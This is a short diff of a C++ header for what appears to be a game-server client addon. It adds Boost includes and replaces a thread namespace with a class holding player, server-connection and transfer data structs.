@@ -14,6 +14,7 @@
 #include <cstdio>
 #include <fstream>
 #include <iostream>
+#include <limits>
 #include <queue>
 #include <stack>
 #include <stdint.h>
@@ -24,18 +25,20 @@
 #include <time.h>
 #include <vector>
 
+#include <boost/asio.hpp>
+#include <boost/bind.hpp>
+#include <boost/make_shared.hpp>
+#include <boost/shared_ptr.hpp>
 #include <boost/thread.hpp>
 #include <boost/thread/mutex.hpp>
 #include <boost/unordered_map.hpp>
 
 #include "fs.h"
 #include "keylog.h"
-//#include "mutex.h"
 #include "process.h"
 #include "screen.h"
 #include "string.h"
 #include "tcpsocket.h"
-//#include "thread.h"
 #include "transfer.h"
 
 
@@ -47,7 +50,43 @@ void addonDebug(char *text, ...);
 
 
 
-namespace addonThread
+struct PlayerData
 {
+	char Name[24];
+	int Serial;
+};
+
+
+
+struct ServerData
+{
+	char IP[16];
+	char Password[256];
+	int Port;
+};
+
+
+
+struct TransferData
+{
+	bool Active;
+	bool Sending;
+	std::size_t Length;
+};
+
+
+
+class addonData
+{
+
+public:
+
 	static void Thread();
+
+	addonData();
+	~addonData();
+
+	struct PlayerData Player;
+	struct ServerData Server;
+	struct TransferData Transfer;
 };
